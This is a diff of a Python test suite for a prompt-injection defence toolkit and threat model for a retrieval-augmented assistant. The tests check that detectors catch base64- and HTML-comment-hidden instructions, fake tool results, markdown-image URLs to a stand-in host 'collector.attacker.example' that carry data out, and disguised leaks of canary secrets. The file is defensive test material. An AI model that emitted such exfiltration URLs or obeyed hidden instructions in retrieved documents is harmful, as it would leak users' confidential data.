@@ -54,9 +54,9 @@ def test_html_comment_variant_hides_the_instruction_from_rendered_text():
 
 def test_base64_variant_conceals_then_decodes_to_an_instruction():
     doc = next(d for d in ac.adversarial_documents() if d.variant is ac.Variant.BASE64)
-    assert "send_reply" not in doc.body  # keyword filters see nothing
+    assert "system instructions" not in doc.body.lower()  # keyword filters see nothing
     decoded = ac.decode_base64_blocks(doc.body)
-    assert any("system" in d.lower() or "verbatim" in d.lower() for d in decoded)
+    assert any("system instructions" in d.lower() for d in decoded)
 
 
 def test_fake_tool_output_variant_is_valid_json_shaped_like_a_tool_result():
@@ -98,7 +98,7 @@ def test_egress_control_blocks_image_exfil_effect():
     sanitized = simulated_answer
     for url in offending:
         sanitized = sanitized.replace(url, "[blocked]")
-    assert ac.off_allowlist_urls(sanitized, allowed) == []
+    assert "collector.attacker.example" not in sanitized   # an oracle independent of the detector
 
 
 def test_write_corpus_round_trips(tmp_path: Path):
@@ -175,3 +175,61 @@ def test_render_threat_table_escapes_pipes():
     ]
     table = tm.render_threat_table(model)
     assert "a\\|b mechanism" in table
+
+
+# --------------------------------------------------------------------------- #
+# detector and validator edge cases
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("text", [
+    "![x](//collector.attacker.example/p.png?d=1)",
+    "HTTPS://collector.attacker.example/p?d=1",
+    "https://intranet.northwind.example:x@collector.attacker.example/p?d=1",
+    "<img src=https:\\\\collector.attacker.example/p.png>",
+])
+def test_url_forms_browsers_fetch_are_flagged(text):
+    assert ac.off_allowlist_urls(text, ["intranet.northwind.example"])
+
+
+def test_allowlisted_host_with_a_query_is_not_flagged():
+    assert ac.off_allowlist_urls("https://intranet.northwind.example?x=1", ["intranet.northwind.example"]) == []
+
+
+@pytest.mark.parametrize("text", ["mid = (lo + hi)//2", "see docs/a//b", "a // b", "C:\\server\\share"])
+def test_code_and_paths_are_not_urls(text):
+    assert ac.off_allowlist_urls(text, ["intranet.northwind.example"]) == []
+
+
+def test_canaries_are_not_assembled_across_separate_views():
+    canary = ac.sensitive_documents(seed=3)[0].canary
+    head, tail = canary[:14], canary[14:]
+    assert ac.find_canary_leaks(f"{tail} is a hash. Ticket {head}", [canary]) == []
+
+
+def test_image_with_a_title_is_extracted():
+    assert ac.extract_image_urls('![a](https://collector.attacker.example/p.png "t")') == [
+        "https://collector.attacker.example/p.png"]
+
+
+def test_transformed_canaries_are_still_found():
+    canary = ac.sensitive_documents(seed=3)[0].canary
+    import base64
+    for outbound in (canary.upper(), canary[:6] + "​" + canary[6:], canary[:6] + " " + canary[6:],
+                     base64.b64encode(f"record follows: {canary} end of record".encode()).decode()):
+        assert ac.find_canary_leaks(outbound, [canary]) == [canary], outbound
+
+
+def test_validate_rejects_a_string_where_a_tuple_of_controls_belongs():
+    model = tm.northwind_rag_model()
+    model.threats.append(tm.Threat("X2", "bad", tm.Stride.TAMPERING, "chat-message", ("hr-documents",),
+                                   "m", "e", tm.Level.LOW, tm.Level.LOW, "Input size caps"))  # missing comma
+    model.threats.append(tm.Threat("X3", "bad", tm.Stride.TAMPERING, "chat-message", ("hr-documents",),
+                                   "m", "e", tm.Level.LOW, tm.Level.LOW, ("  ",)))
+    problems = model.validate()
+    assert any(p.startswith("X2:") for p in problems) and any(p.startswith("X3:") for p in problems)
+
+
+def test_coverage_gaps_name_untreated_entry_points():
+    gaps = tm.northwind_agent_model().coverage_gaps()
+    assert any("tool-result" in g for g in gaps)
